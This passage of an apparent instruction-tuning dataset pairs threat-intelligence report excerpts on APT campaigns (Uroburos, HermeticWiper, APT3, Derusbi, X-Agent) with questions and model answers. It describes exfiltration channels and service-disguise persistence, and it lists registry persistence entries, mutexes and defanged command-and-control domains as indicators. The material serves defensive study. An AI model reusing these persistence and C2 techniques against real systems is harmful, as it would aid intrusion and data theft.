    "output": "The X-Shell RAT is commercially available software that has been used in a number of attacks. Different versions of the X-Shell RAT produce varying communications, with some generating the same X-Shell C601 communications observed to 'path.alyac.org'. Similar communications have also been observed in other attacks, thought to be generated by an X-Shell C603 RAT. While it is not known whether the same attackers used these malicious files, the presence of similar communications suggests a potential link between different attacks and the use of the X-Shell RAT in a coordinated manner.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Third party tools\nWe found classic post-exploitation tools, used by a lot of different APT actors. The following list provides an overview of the tools found in the virtual file system:\n\uf0b1 Dumper for NTLM (hash of a user's password). This information can be used to perform \"pass the hash\"2 (<>)attacks, to compromise new systems within the infrastructure\n\uf0b1 information gathering tools, to get information on the infected system\n\uf0b1 RAR tools, to create archives of stolen documents\n\uf0b1 Microsoft Office document stealer\n\uf0b1\u2026\n2 http://en.wikipedia.org/wiki/Pass_the_hash\nMedium Headline: Injected libraries - controlling the activities\nThe driver injects several libraries into user land. These libraries are stored in encrypted form in the queue file. These files are used to create a kind of \"proxy\" between the kernel land and the user land. The driver injects two noteworthy libraries:\n\uf0b1 inj_services_Win32.dll\n\uf0b1 inj_snake_Win32.dll\nIf the infected system is a 64-bit system, Win32 is replaced by Win64. The libraries are very huge (more than 150 functions) and contain a lot of features. They are able to manipulate the queue file from the user land. Following, a list of functions dedicated to the queue management (qm):\n\uf0b1 qm_create()\n\uf0b1 qm_enum()\n\uf0b1 qm_find_first()\n\uf0b1 qm_free()\n\uf0b1 qm_move()\n\uf0b1 qm_pop()\n\uf0b1 qm_push()\n\uf0b1 qm_read()\n\uf0b1 qm_read_hdr()\n\uf0b1 qm_rm()\n\uf0b1 qm_rm_list()\n\uf0b1 qm_set_dates()\n\uf0b1 qm_write()\nThe libraries have the capability to create and manage a pcap3 (<>)capture. The purpose of this feature is to generate a snapshot of the network traffic.\nThe libraries are furthermore used to exfiltrate data to the outside world, namely the attackers. We identified several protocols to perform this task: generally, the configuration needed for each protocol is stored in the queue file and not within the library itself.\n\uf0b1 HTTP protocol\nthe attackers can choose to use a website to exfiltrate data. The rootkit supports GET and POST requests and proxy authentication, too. The default URI is http://%s/default.asp but it is configurable. The media type of the request is chosen from the following list:\n\u2022 application/vnd.ms-powerpoint\n\u2022 application/vnd.ms-excel\n\u2022 application/msword\n\u2022 image/gif\n\u2022 image/x-bitmap\n\u2022 image/jpeg\n\u2022 image/pjpeg\n\u2022 application/x-shockwave-flash\n\u2022 or */*\n3 http://en.wikipedia.org/wiki/Pcap\n\uf0b1 ICMP protocol\nthe attackers can choose to use ICMP (ping) to exfiltrate data\n\uf0b1 SMTP protocol\nthe attackers can send exfiltrated data by email\n\uf0b1 Named pipe the attackers can use Microsoft's named pipe to communicate to another infected machine. This case will be described in the next chapter\nThe design chosen by the developers is truly efficient: to add a new protocol and a new capability, the attackers do not need to recompile (or reinstall) the entire rootkit. They simply need to adjust the library and replace the library in the queue file with the adjusted one. The library usage results in modularity well thought out.\n\nExplain how Uroburos' injected libraries facilitate communication between the kernel and user space, and describe the specific functionalities they provide for managing the queue file and exfiltrating data.",
    "output": "Uroburos' driver injects several libraries into user space, creating a 'proxy' between the kernel and user land. Two key libraries are inj_services_Win32.dll and inj_snake_Win32.dll (or their 64-bit counterparts). These libraries contain numerous functions (over 150) that enable extensive manipulation of the queue file, including creation, enumeration, reading, writing, and deletion of entries. Additionally, these libraries support the generation of pcap captures to snapshot network traffic. For data exfiltration, the libraries use various protocols such as HTTP, ICMP, SMTP, and named pipes. The configuration for each protocol is stored in the queue file, allowing easy adjustments without recompiling the rootkit. This modular design enhances flexibility and efficiency, making it easier for attackers to update and extend Uroburos' capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Team Introduction\nCyber Squared Inc.'s ThreatConnect Intelligence Research Team (TCIRT) tracks a number of threat groups around the world. Beginning in the summer of 2013, TCIRT identified a suspected Pakistani-origin threat group. This group was revealed by TCIRT publicly in August 2013. In the months following the disclosure, we identified new activity. Cyber Squared partnered with experts at FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its Operation \"Arachnophobia\". The following report is a product of collaborative research and threat intelligence sharing between Cyber Squared Inc.'s TCIRT and FireEye Labs.\nQ: Why did Cyber Squared Inc.'s ThreatConnect Intelligence Research Team (TCIRT) partner with FireEye Labs in their investigation of Operation Arachnophobia, and what specific insights were they aiming to gain through this collaboration?",
    "output": "Cyber Squared Inc.'s ThreatConnect Intelligence Research Team (TCIRT) partnered with FireEye Labs to investigate Operation Arachnophobia because they had identified new activity related to the suspected Pakistani-origin threat group after its initial public disclosure in August 2013. The collaboration aimed to leverage the expertise and resources of both organizations to examine these new observations. By working together, they sought to uncover new research and insights into the group's activities, tactics, techniques, and procedures (TTPs), thereby enhancing their understanding of the threat and improving their ability to counteract similar attacks in the future.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 4.1 Compromised Victims: The Evidence\nMistakes on the part of the attackers allowed us to view the attackers' list of victims at four command and control locations. In addition, we were able to recover exfiltrated data from two locations. This provided us with a snapshot of the computers that have been compromised by the attacks. Thus, this is not a complete list of all those compromised by this attacker. Rather, it is simply those checking in with or uploading data to the portions of the network that we were able to view. Moreover, there was considerable overlap between different methods of command and control, with individual computers checking in at multiple locations. Therefore, we do not have consistent data across all compromised computers. There are two categories of victims: those for whom we only have technical identifying information, such as IP addresses; and those from whom we have recovered exfiltrated data but for whom we do not have IP addresses. In cases where we do not have IP addresses, the identity of the victim is determined from the contextual information found within the exfiltrated data itself.\nWe obtained information on victims from:\n\u2462 a web-based interface that lists cursory information on compromised computers located on one command and control server;\n\u2462 text files in web-accessible directories on three command and control servers that list detailed information on compromised computers;\n\u2462 information obtained from email accounts used for command and control of compromised computers\n\u2462 information obtained from one command and control server from which we retrieved exfiltrated documents (but not necessarily technical identifying information);\n\u2462 information obtained from our DNS sinkhole.\nThe primary method of identification used in this section is based upon the IP address of the compromised computer. We looked up the associated IP address in all five Regional Internet Registries (RiR) in order to identify the country and network to which the IP address is assigned. We then performed a reverse Domain Name System (DNS) look-up on each IP address. DNS is the system that translates domain names into IP addresses; reverse DNS is a system that translates an IP address into a domain name. This can potentially provide additional information about the entity that has been assigned a particular IP address. If we discovered a domain name, we then looked up its registration in WHOIS, which is a public database of all domain name registrations and provides information about who registered the domain name.\nIt was possible to identify the geographic location of the compromised computer at the country level as well as the network to which the IP address was assigned. However, in most cases there was little information in the RiRs pertaining to the exact identity of the compromised entity. Where possible, we note the entity identified by data obtained from the RiRs.\nThe following list of compromised computers was generated by parsing information from unique victims, not solely IP addresses. The attackers assign the compromised computer a name based on the host name of the computer, which allows us to identify unique victims rather than relying only on IP addresses. In fact, several of the unique victims have multiple IP addresses associated with them, sometimes spanning multiple countries. Here we have generated a geographic breakdown based on the first IP addresses recorded for each compromised computer.\nFigure 4:\nLocations of Compromised Computers in the Shadow Network\nWhile there is considerable geographic diversity, there is a high concentration of compromised computers  located in India. However, we were only able to identify two of the compromised entities:\n\u2462 Embassy of India, United States\n\u2462 Embassy of Pakistan, United States\nMedium Headline: 4.1.1 Sinkhole\nA DNS sinkhole server is a system that is designed to take requests from a botnet or infected systems and record the incoming information. The sinkhole server is not under the control of the malware authors and can be used to gain an understanding of a botnet's operation. There are a few different techiques that are used to sinkhole botnet traffic. The easiest method is to simply register an expired domain that was previously used to control victim systems. Being able to do this generally indicates the botnet operator has lost control of the domain, forgotten to renew it, or that the botnet has been abandoned. Another method focuses on reverse-engineering the malware to determine if it has \"fail over\" command and control servers or special methods to compute future domains. This may require that a domain name generation algorithm be discovered and that one must register the domain names before the attacker does (Stone-Gross et al. 2009).\nDuring the GhostNet investigation we found that a computer at the OHHDL was compromised by both the GhostNet and what we are now calling the Shadow network. We had a list of serveral domains that were expiring that we had linked to attacks against OHHDL. We were able to register several of these domain names in order to gather information about the network's command and control infrastructure, communication methods,\nand victim systems. We were able to register and monitor four of the domain names mentioned in Tracking GhostNet. In addition, we were able to register several others which we linked to the Shadow network along with one, www.assam2008.net, which we believe to be yet another separate, but possibly affiliated, network.\n\u2462 www.assam2008.net\n\u2462 www.msnxy.net\n\u2462 www.sysroots.net\n\u2462 www.womanld.com\n\u2462 www.womannana.com\n\u2462 www.lookbyturns.com\n\u2462 www.macfeeresponse.com\n\u2462 www.macfeeresponse.org\nWe were able to observe the file paths associated with malware that were requested by compromised computers. In total, we found that during this period 6,902 unique IPs requested paths associated with the malware that used these hosts as command and control servers. However, counting the number of infected hosts purely by IP addresses is problematic. In fact, botnets are generally much smaller than the total sum of unique IP  addresses would suggest (Stone-Gross et al. 2009; Rajab et al. 2007). This network, which is focused on stealing documents from specific targets, is expected to be small in size.\nQ: What methods were used to gather information about the Shadow network's command and control infrastructure, communication methods, and victim systems? Describe the techniques employed.",
    "output": "The investigators used several methods to gather information about the Shadow network's command and control infrastructure, communication methods, and victim systems. One method involved registering expired domains that were previously used to control victim systems, indicating that the botnet operator had lost control of the domain, forgotten to renew it, or that the botnet had been abandoned. Another method focused on reverse-engineering the malware to determine if it had 'fail over' command and control servers or special methods to compute future domains. This required discovering a domain name generation algorithm and registering the domain names before the attacker did. During the GhostNet investigation, they found that a computer at the Office of His Holiness the Dalai Lama (OHHDL) was compromised by both the GhostNet and the Shadow network. They registered several expiring domain names linked to attacks against OHHDL and monitored them to gather information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nThe experts of G DATA's SecurityLabs discovered a cyber-espionage campaign that perfectly exemplifies the way how targeted attacks work. The purpose of this campaign was to steal valuable documents from the targeted entity. We entitle this operation \"TooHash\".\nThe attackers' modus operandi is to carry out spear phishing using a malicious Microsoft Office document as an attachment. The attackers do not choose their targets indiscriminately, which we derive from the fact that they sent specially crafted CV documents, probably to human resources management employees. Naturally, the recipients are inclined to open such documents on a daily base.\nThe majority of discovered samples were submitted from Taiwan. As part of the documents are in Simplified Chinese which is used in the Chinese mainland and others in Traditional Chinese which is used in Hong Kong, Macao and Taiwan, these malicious documents might have been used against targets in the whole Greater China area.\n\nAnswer this question based on the above context: How did the TooHash cyber-espionage campaign utilize social engineering techniques to target specific individuals within organizations?",
    "output": "The TooHash cyber-espionage campaign utilized social engineering techniques by employing spear phishing with malicious Microsoft Office documents attached. These documents were specifically crafted as CVs, likely targeting human resources management employees. This approach leverages the natural inclination of HR personnel to open such documents regularly, thereby increasing the likelihood of successful infection. The attackers carefully selected their targets, indicating a high level of precision and intentionality in their strategy.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Mitigations\nThe compromised systems leading to the delivery of the wiper have involved exploitation of vulnerable systems: a Microsoft Exchange server, and an Apache Tomcat server. Defenders concerned specifically about HermeticWiper should ensure that any such servers on their networks are fully updated and patched. Similarly, enterprises should prioritize detection of web shells and exploitation on their perimeters. Detection of a wiper malware at the point of execution is often too late in the kill chain to ensure continued organizational operations. Focusing on the initial stages is important to avoid such malware being executed.\nEndeavoring to prevent, detect and block early-stage activity observed in the delivery of HermeticWiper, such as malicious PowerShell usage and SMB exploitation, is thus recommended. The adversary, nimble enough to exploit more than one type of system to deliver HermeticWiper, is likely capable of delivering malware to other vulnerable systems as well, and consistent patching and updating of all external-facing systems is therefore critical.\nOn February 26, 2022, CISA concerning the use of destructive malware, specifically HermeticWiper and WhisperGate, against Ukrainian organizations. General best practices and mitigations for wiper malware are provided in the alert. By keeping updated on the current situation in Ukraine, in particular in the cyber realm, an organization can better prioritize patching and other mitigations based on what is currently known of potential threats.\nInsikt Group has provided 2 YARA rules to detect HermeticWiper and PartyTicket in Appendix B.\nBig Headline: Outlook\nThis is the second destructive malware that has emerged over the past month, coinciding with the timing of attacks on Ukraine, and exhibiting a methodology similar to past attacks by Russian government-associated actors. We expect further cyberattacks or malicious tools to emerge and be used to destroy data and cause other disruptions. While there is not enough evidence to tie either of these wipers to a specific threat actor or group, HermeticWiper's similarities to previous Russian state-linked malware variants, such as NotPetya, could suggest some relationship.\nBig Headline: About Recorded Future\nRecorded Future is the world's largest intelligence company. The Recorded Future Intelligence Platform provides the most complete coverage across adversaries, infrastructure, and targets. By combining persistent and pervasive automated data collection and analytics with human analysis, Recorded Future provides real-time visibility into the vast digital landscape and empowers clients to take proactive action to disrupt adversaries and keep their people, systems, and infrastructure safe. Headquartered in Boston with offices and employees around the world, Recorded Future works with more than 1,300 businesses and government organizations across 60 countries.\nLearn more at recordedfuture.com and follow us on Twitter at @RecordedFuture.\n\nQuestion: How does the mitigation strategy for HermeticWiper focus on preventing its delivery and execution? What specific measures are recommended for defenders to implement?\n\nAnswer:",
    "output": "The mitigation strategy for HermeticWiper focuses on preventing its delivery and execution by addressing vulnerabilities in the initial stages of the attack. Defenders are advised to ensure that Microsoft Exchange servers and Apache Tomcat servers are fully updated and patched. Additionally, they should prioritize the detection of web shells and exploitation on their perimeters. Early-stage activities such as malicious PowerShell usage and SMB exploitation should be prevented, detected, and blocked. Consistent patching and updating of all external-facing systems are critical due to the adversary's capability to exploit multiple types of systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Activity Overview\nIn the last several weeks, APT3 actors launched a large-scale phishing campaign against organizations in the following industries:\nAerospace and Defense\nConstruction and Engineering\nHigh Tech\nTelecommunications\nTransportation\nUpon clicking the URLs provided in the phishing emails, targets were redirected to a compromised server hosting JavaScript profiling scripts. Once a target host was profiled, victims downloaded a malicious Adobe Flash Player SWF file and an FLV file, detailed below. This ultimately resulted in a custom backdoor known as SHOTPUT, detected by FireEye as Backdoor.APT.CookieCutter, being delivered to the victim's system.\nThe payload is obscured using xor encoding and appended to a valid GIF file.\n\nWhy did APT3 actors use JavaScript profiling scripts in their phishing campaign during OperationClandestineWolf? How does this technique enhance the effectiveness of their attack strategy?",
    "output": "A: APT3 actors used JavaScript profiling scripts in their phishing campaign to gather information about the target hosts. This technique enhances the effectiveness of their attack strategy by allowing the attackers to tailor their subsequent actions based on the specific characteristics of the victim's system. By profiling the target, the attackers can ensure that the malicious payloads they deliver are more likely to execute successfully without detection, thereby increasing the chances of compromising the victim's system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Intro:\nAt CrowdStrike, \"Intelligence powers everything we do.\" This is not a corporate slogan, and it is not a marketing theme. It is the realization of having the most dedicated professionals focusing on solving problems that have real strategic, political, and financial impact on our customers. When we consider the problems facing our customers, we know that intelligence allows them to make key decisions that can mean the difference between disaster and triumph.\nIn the earliest days building CrowdStrike, we drew heavily on the concepts encompassed in Colonel John Boyd's OODA loop (OODA is an acronym for Observe, Orient, Decide, Act). It has been applied over the years to all manner of decision-making situations. The core of the OODA model is that a decision-making process is broken into phases, and in an adversarial encounter, two entities will go through the same process. Whichever entity goes through the process the fastest will likely prevail.\nThe reason that intelligence powers everything we do is that we seek to provide our customers with the ability to come to a decision (the last step of the OODA loop) before the adversary does, thus ensuring a favorable outcome. In intelligence circles, this is often referred to as decision advantage, and when dealing with adversaries trying to compromise your enterprise security, you want it.\nThroughout 2014, the activity monitored by CrowdStrike in the cyber domain was reflective of the events unfolding in the real world. This was punctuated in late 2014 with the now-infamous attack attributed to North Korean actors who levied destructive malware in a flagrant assault against a private entity. The actor in this case, which CrowdStrike has traced back to 2006, has a history of using destructive code against its targets. This actor again launched attacks in December against its usual adversary, the Republic of Korea.\nThe highly publicized events that initially suppressed the release of a movie deemed offensive by the Democratic People's Republic of Korea resulted in unprecedented awareness of the power that one adversary can wield against a target if they are suitably motivated.\nThis final chapter in 2014 closed out what was a year of attribution and adversary focus. In May, the U.S. Department of Justice, in concert with various partners including CrowdStrike researchers, disrupted the infrastructure of Gameover Zeus, a prolific\nbotnet that was the scourge of security practitioners across the globe. This disruption, which also impacted the nefarious CryptoLocker malware, provided the pause in adversary activity needed by law enforcement to levy charges and take legal action to permanently impact this malware.\nIn that same month, the U.S. Department of Justice charged five officers in the People's Liberation Army, the military organ of the People's Republic of China, with violating 18 U.S. Code \u00a7 1030. In June, CrowdStrike published a detailed analysis of an actor associated with the 12th Bureau of the Third General Staff Department. This report demonstrated a direct lineage between malware targeting a variety of western technology and government targets, and an individual in the Chinese intelligence service.\nThe events that unfolded in the South China Sea near the Paracel Islands, the emergence of ISIS, the unrest in Ukraine, and the disappearance of a Malaysian airliner all took on a cyber element. This is no coincidence. The nation-states of the world are all seeking the aforementioned decision advantage, and they know that the use of interconnected computers allows them to collect intelligence that gives them the ability to make informed decisions.\nOur customers rely on us to provide them intelligence to thwart these attacks and make informed decisions. This report will provide an overview of some of the intelligence analyzed by the CrowdStrike team over the past year.\nWrapping so much analysis into one report means a lot of tough decisions needed to be made on what to include. This report is structured to provide Key Findings first. Following the key findings are some graph data based on the patterns that emerged though visibility attained by the CrowdStrike team; this is meant to provide a snapshot of the dozens of adversaries tracked this year. In the Notable Activity section, we cover the three motivations that we see: Criminal, Targeted-Intrusion, and Hacktivist/Activist. We explore notable activity around zero-day exploits and event-specific operations conducted by these adversaries.\nThere are so many interesting actors we discovered this year, and even more that advanced from previous years; the Know the Adversary section contains interesting observations for just a few of the adversaries from the intelligence reports we publish through the subscription service. Finally, we provide an analysis of the 2013 report predictions for the past year, and a forecast of what to expect in 2015.\nMedium Headline: Key Findings:\n\u2022 Financial crime malware disruptions in 2014 changed the threat landscape by eliminating two prevalent malware families.\n\u2022 Since the high-profile Target breach in 2013, Point- of-Sale (PoS) malware became prevalent in the targeting of numerous retail organizations. Look for policy and process changes to mitigate this threat in 2015.\n\u2022 China-based adversaries continued to be the most prolific in the targeted intrusion space, but public reporting on a number of actors linked to Iran and Russia show the breadth of the threat from targeted intrusion operators.\n\u2022 High-profile events continued to drive a significant number of targeted intrusion campaigns. In 2014, unpredictable events such as the Malaysia Airlines incidents and increased unrest in Ukraine drove campaigns more than planned events such as the World Cup or the G20 Summit.\n\u2022 Malicious activity related to elections in Ukraine and Hong Kong underscore the threat state-sponsored adversaries (and possibly hacktivist or nationalist actors) pose to democratic processes.\n\u2022 CrowdStrike reported on a number of new, sophisticated adversaries from China and Russia such  as HURRICANE PANDA, GOTHIC PANDA,  FANCY BEAR, and BERSERK BEAR.\nMedium Headline: State of the Union:\nDuring 2014, CrowdStrike Intelligence observed significant activity from 39 state-sponsored and nationalist adversaries targeting numerous verticals all over the globe. The charts below provide a high-level illustration of this targeting. There are a few takeaways from this data.\nVietnam and GOBLIN PANDA were respectively the most targeted country and the most active adversary. From late spring through summer, GOBLIN PANDA conducted consistent targeted intrusion operations targeting organizations in Vietnam focused on tensions in the South China Sea. These campaigns relied primarily on spear phishing with malicious documents that dropped malware (mostly PlugX) along with Vietnamese-language decoy documents. The content of these decoys often came from documents produced by Vietnam's government, which indicates that the adversary possibly infiltrated the government's network and was using stolen documents in its operations. The frequency of GOBLIN PANDA's operations, and targeted activity aimed at Vietnam in general, tailed off in the final months of 2014, but the volume of activity in spring and summer was enough to push them to the top of CrowdStrike's targeting stats.\nObserved AdversAry Activity during 2014\n\u25a0 GOBLIN PANDA\n\u25a0 VIXeN PANDA\n\u25a0 DeeP PANDA\n\u25a0 eMISSARy PANDA\n\u25a0 eNeRGeTIC BeAR\n\u25a0 PIRATe PANDA\n\u25a0 FLyING KITTeN\n\u25a0 NUMBeReD PANDA\n\u25a0 LOTUS PANDA\n\u25a0 VICeROy TIGeR\n\u25a0 eXTReMe JACKAL\n\u25a0 PITTy PANDA\n\u25a0 GOTHIC PANDA\n\u25a0 DeADeye JACKAL\n\u25a0 PReDATOR PANDA\n\u25a0 DyNAMITe PANDA\n\u25a0 TeMPeR PANDA\n\u25a0 PALe PANDA\n\u25a0 VIOLIN PANDA\n\u25a0 SILeNT CHOLIMMA\n\u25a0 HURRICANe PANDA\n\u25a0 SABRe PANDA\n\u25a0 SAMURAI PANDA\n\u25a0 DAGGeR PANDA\n\u25a0 AURORA PANDA\n\u25a0 MAVeRICK PANDA\n\u25a0 KeyHOLe PANDA\n\u25a0 STONe PANDA\n\u25a0 SPICy PANDA\nMedium Headline: State of the Union:\nsignificAnt tArgeting by cOuntry in 2014\nPlugX was by far the most used malware variant for targeted activity during 2014. It proliferated greatly amongst China-based targeted intrusion adversaries and now appears to be the tool of choice for many. The malware has been around for years and has been used by multiple Chinese actors for quite some time; however, the frequency of PlugX use during 2014 revealed just how prominent it is.\nPlugX is used by both more advanced China-based adversaries such as AURORA PANDA and adversaries of a lower level of sophistication such as GOBLIN PANDA. The reason for its prevalence is not clear. It is possible that there is a central malware dissemination channel supplying many Chinese adversaries and this is why so many groups are now using it. It is also possible that groups not using it in the past were more recently able to obtain it via the underground or public malware repositories.\nMedium Headline: State of the Union:\nThe stats below also reflect a wide range of other malicious cyber activity associated with numerous other events. The conflict in Ukraine resulted in targeted intrusion and other activity from both Russia-based and China-based adversaries. Adversaries with a nexus to Iran were also very active in 2014 targeting western government entities as well as private organizations, particularly in the defense sector. elections were also heavily targeted in 2014 both in Ukraine and in Hong Kong, where the Umbrella Revolution garnered a great deal of attention from Chinese actors. These and a number of other topics are covered in more detail in the sections below.\n\nWhat was the significance of the disruption of the Gameover Zeus botnet and CryptoLocker malware in May 2014?",
    "output": "The disruption of the Gameover Zeus botnet and CryptoLocker malware in May 2014 was significant because it provided law enforcement with a critical pause in adversary activity. This pause allowed authorities to levy charges and take legal action to permanently impact the malware, demonstrating the effectiveness of coordinated efforts between law enforcement and cybersecurity researchers in combating cyber threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Malware Analysis\nAll four variants perform an HTTP request that is almost identical, with the exception of the Command & Control server and a small variant in one of the \"Referrer\" values. Even a 16-digit value in the URL and Cookie was the same. This beacon format and 16-digit value was also observed in the PGV_PVID variants analyzed earlier this year by Proofpoint.\nThree of the samples contained the following string of interest: \"payload_service_x64.dll\".\nThese PGV_PVID variants were observed encoding some of its configuration, APIs and other strings with a single-byte XOR key. Some of the keys used are: 0x90, 0xEB and 0x57.\nIt was also interesting to see how these samples were trying to disguise themselves during entrenchment as valid services in the system to try to confuse incident responders, computer forensics investigators and network administrators. The following screenshots show the Microsoft service management console with the legit and malicious service (malicious service highlighted):\nThe following is a list of the malware samples analyzed:\nTwo samples of the network traffic format associated with this threat:\nMedium Headline: Indicators of Compromise\nRegistry Entrenchment\nHKLM\\System\\CurrentControlSet\\services\\hkmservice\\Parameters\\Se [CWD]\\64.dll\nHKLM\\System\\CurrentControlSet\\services\\ swprvsvc\\Parameters\\ServiceDll=[CWD]\\swprv64.dll\nHKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{BD5A117E-658C-4b8c-AED33D177B36F0A8}\\stubpath=C:\\Windows\\system32\\regsvr32.exe /s [CWD]\\MSChartCtrl.ocx\nService Information\nDisplay Name 1: Health Key and Certificate Management Service\nService Name 1: hkmservice\nDisplay Name 2: Microsoft office products Shadow Copy Provider\nService Name 2: swprvsvc\nMutex\n2-7-26-96EFFFFD-6666-706b-6506-3B6BC6486663-0-7-2\n1-5-19-85EDC10D-6745-404b-A50D-4BCBC6480873-1-5-19\nCommand & Control Servers\ngoogle-dash[dot]com\noffice365e[dot]com\nkruul[dot]com\nnsa.org[dot]cn\nURLs\n/projects/security/pki/nss/index.htm?[16 digits]\n/developers/menu.php?[16 digits]\n/pki/nss/init?[16 digits]\n/solutions/company-size/smb/index.htm?[16 digits]\n/selfservice/microsites/search.php?[16 digits]\n/store/category_groups?[16 digits]\nMedium Headline: Domains identified from pDNS pivots\nasixgroupincmeer[.]biz\nattrcorp[.]com\nsmtp.attrcorp[.]com\noffice365e[.]com\noffice365e[.]com\nusapappers[.]com\ne.usapappers[.]com\nbee.usapappers[.]com\nftp.usapappers[.]com\nsun.usapappers[.]com\nwow.usapappers[.]com\nshot.usapappers[.]com\nemail.usapappers[.]com dijlacultus[.]com bbs.dijlacultus[.]com fok.dijlacultus[.]com back.dijlacultus[.]com info.dijlacultus[.]com live.dijlacultus[.]com mail.dijlacultus[.]com news.dijlacultus[.]com serv.dijlacultus[.]com tele.dijlacultus[.]com thec.dijlacultus[.]com zero.dijlacultus[.]com swiss.dijlacultus[.]com living.dijlacultus[.]com\nmailsrv.dijlacultus[.]com\ngoogle-dash[.]com\nvirtualboxs[.]com\nsteletracker[.]com\nvmtools[.]net\npwc.vmtools[.]net\nwin.winlogon[.]net\nasia.winlogon[.]net\nwinner.winlogon[.]net\nhawkthorn[.]net\nstrightspunddeals[.]net\nnorthropgruman[.]org\nowa.northropgruman[.]org\nvpn.northropgruman[.]org\nsoft.northropgruman[.]org\nupdate.northropgruman[.]org\nsoftware.northropgruman[.]org\ncegauoqsykgqecqc[.]org\neimqqakugeccgwak[.]org\nuogwoigiuweyccsw[.]org\nsoyy[.]info\nhaha[.]school\nns1.krimeware[.]com\nns2.krimeware[.]com\ntianzhen[.]co\nwww[.]tianzhen[.]co\nmonsterlegendsvn[.]biz\nwww[.]monsterlegendsvn[.]biz\nnickytoh[.]com\nwww[.]nickytoh[.]com\nseratjati[.]com\naiselamodefactory[.]com\ntasty-and-healthy[.]com\nnickytoh[.]net\nwww[.]nickytoh[.]net\nanimationmyth[.]net\nwww[.]animationmyth[.]net\npetersenstore[.]org\nwww[.]petersenstore[.]org\nforum.haha[.]school\nmusicis[.]science\nRead the text above and answer this question: What encryption technique was used by the Derusbi PGV_PVID variants to encode their configuration and strings, and why is this significant for malware analysis?",
    "output": "The Derusbi PGV_PVID variants encoded some of their configuration, APIs, and other strings using a single-byte XOR key, with examples including 0x90, 0xEB, and 0x57. This encryption technique is significant because it adds a layer of obfuscation that makes it more difficult for analysts to understand the malware's functionality and intent. Recognizing and decoding these XOR keys is crucial for effective malware analysis, as it allows analysts to uncover hidden configurations and strings that can provide insights into the malware's capabilities and command-and-control infrastructure.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: OUTCOMES AND CONCLUSION\nThe eastern Ukrainian front has been markedly impacted by heavy fighting involving Russian troops and pro-Russian rebel fighters deployed to this region. Artillery forces on both sides of the conflict have served an important role. For Ukrainian troops, artillery forces have also shouldered a heavy cost. Open-source reporting indicates losses of almost 50% of equipment in the last 2 years of conflict amongst Ukrainian artillery forces and over 80% of D-30 howitzers were lost, far more than any other piece of Ukrainian artillery 9.9\nBetween July and August 2014, Russian backed forces launched some of the most decisive attacks against Ukrainian forces, resulting in significant loss of life, weaponry, and territory. According to open sources, Ukrainian service personnel from the 24th and 72nd Mechanized Brigade, as well as the 79th Airborne Brigade, were among the units to have suffered casualties. International monitoring groups later assessed some of the attacks were likely to have come from inside Russian territory.10\nA malware-infected \u041f\u043e\u043f\u0440-\u041430.apk application probably could not have provided all the necessary data required to directly facilitate the types of tactical strikes that occurred between July and August 2014. Eyewitness accounts from individuals within the impacted units reported seeing an unmanned aerial vehicle (UAV) used in the area prior to one attack, underscoring the need for precise locational data for these particular strikes and introducing the possibility\nthat the Android malware served to support the reconnaissance role of traditional battlefield assets. Although traditional overhead intelligence surveillance and reconnaissance (ISR) assets were likely still needed to finalize tactical movements, the ability of this application to retrieve communications and gross locational data from infected devices, could provide insight for further planning, coordination, and tasking of ISR, artillery assets, and fighting forces.\nThe X-Agent Android variant does not exhibit a destructive function and does not interfere with the function of the original \u041f\u043e\u043f\u0440-\u041430.apk  application. Therefore, CrowdStrike Intelligence has assessed that the likely role of this malware is strategic in nature. The capability of the malware includes gaining access to contacts, Short Message Service (SMS) text messages, call logs, and internet data, and FANCY BEAR would likely leverage this information for its intelligence and planning value.\nCrowdStrike Intelligence assesses a tool such as this has the potential ability to map out a unit's composition and hierarchy, determine their plans, and even triangulate their approximate location. This type of strategic analysis can enable the identification of zones in which troops are operating and help prioritize assets within those zones for future targeting.\nAdditionally, a study provided by the International Institute of Strategic Studies determined that the weapons platform bearing the highest losses between 2013 and 2016 was the D-30 towed howitzer.11  It is possible that the deployment of this malware infected application may have contributed to the high-loss nature of this platform.\nThe development of the X-Agent Android malware represents an expansion of FANCY BEAR capabilities in terms of mobile malware, and illustrates the practical application of full-spectrum combat as envisioned in the eponymous doctrinal writings of General Valery GERASIMOV. As a part of full-spectrum operations in Ukraine, Russia-based adversaries have leveraged malware on the battlefield, in the civil sector, and against critical infrastructure. They have also engaged in aggressive information operations in the media. In relation to this broader picture of Russian computer operations, the approach to targeting mobile smartphone and tablet devices in order to gain strategic insight into communications is a tactic that cannot be disregarded.\nCrowdStrike assesses that the observed and described X-Agent implant targeting Ukrainian military Android devices running the \u041f\u043e\u043f\u0440-\u041430.apk\napplication is likely only the initial iteration of this type of malware. While this malware was initially discovered in a battlefield environment, an adversary could also leverage it in attacks against non-military targets. Mobile devices and internet-connected technology have increasingly proliferated civilian and military organizations. This technique may very likely be deployed in the political, government, or non-governmental sectors in the near future.\n1-The name \u041f\u043e\u043f\u0440-\u041430.apk is an abbreviated variant of \u041f\u043e\u043f\u0440\u0430\u0432\u043a\u0438-\u041430 which translates to Correction-D30.\n2-For more information, contact CrowdStrike\n3-vKontakte is a Russian social media networking site alike in layout and functionality to Facebook.\n4-http://programs-art.at.ua\n5-For more information, contact CrowdStrike\n6-Igor Sutyagin, \"Russian Forces in Ukraine,\" Royal United Services\nInstitute, March 2015, https://rusi.org/sites/default/files/201503_bp_ russian_forces_in_ukraine.pdf\n7-https://www.youtube.com/watch?v=qp-7e_ZGH8I\n8-Data for image circa 2015. Note: These maps do not provide data for Crimea. According to various sources, there are estimates suggesting that, in greater Crimea 80% speak Russian, 10% speak Ukrainian, and 10% speak Tatar. The percentage of Russian speakers is 